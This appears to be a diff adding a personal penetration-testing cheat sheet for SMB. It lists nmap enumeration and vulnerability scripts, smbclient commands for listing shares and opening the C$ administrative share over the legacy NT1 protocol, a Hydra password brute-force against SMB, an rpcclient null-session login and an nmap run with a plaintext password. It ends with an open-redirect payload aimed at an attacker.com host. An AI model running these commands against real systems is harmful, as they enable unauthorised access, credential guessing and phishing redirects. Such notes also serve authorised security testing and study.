@@ -1,0 +1,22 @@
+smb 
+nmap target --script=smb-enum*
+nmap targe --script=smb-vuln*
+nmap target --script=smb-os*
+to list all the shares
+smbclient -L \\192.168.1.34 --option='client min protocol=NT1' 
+
+to gain access to a share 
+smbclient \\\\192.168.1.34\\C$ --option='client min protocol=NT1'
+
+HYDRA -l IEUSER -P password.txt 192.168.1.1 smb 
+
+smbclient \\\\192.168.1.3\\inetpub --option='client min protocol=NT1' -U IEUSER 
+
+for login with null user
+rpcclient -U "" 192.168.1.31
+
+nmap --script smb-enum* --script-args smbusername=IEUSER,smbpass=PA$$WORD! -p445 192.168.1.3 
+
+
+
+redirect=http%3a//google.com///attacker.com
